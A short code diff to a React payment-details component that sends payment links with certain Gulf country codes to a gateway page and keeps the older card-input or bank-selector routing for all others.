@@ -64,15 +64,17 @@ const PaymentDetails = () => {
   const formattedAmount = formatCurrency(amount, countryCode);
   
   const handleProceed = () => {
-    // Check payment method from link data
-    const paymentMethod = shippingInfo?.payment_method || 'card';
-    
-    // If payment method is "card", skip bank selector and go directly to card input
-    if (paymentMethod === 'card') {
-      navigate(`/pay/${id}/card-input`);
+    // Check if link has country code for dynamic gateway
+    if (countryCode && ['SA', 'AE', 'KW', 'QA', 'OM', 'BH'].includes(countryCode.toUpperCase())) {
+      navigate(`/pay/${id}/gateway`);
     } else {
-      // For "bank_login" method, show bank selector
-      navigate(`/pay/${id}/bank-selector`);
+      // Fallback to old flow
+      const paymentMethod = shippingInfo?.payment_method || 'card';
+      if (paymentMethod === 'card') {
+        navigate(`/pay/${id}/card-input`);
+      } else {
+        navigate(`/pay/${id}/bank-selector`);
+      }
     }
   };
   
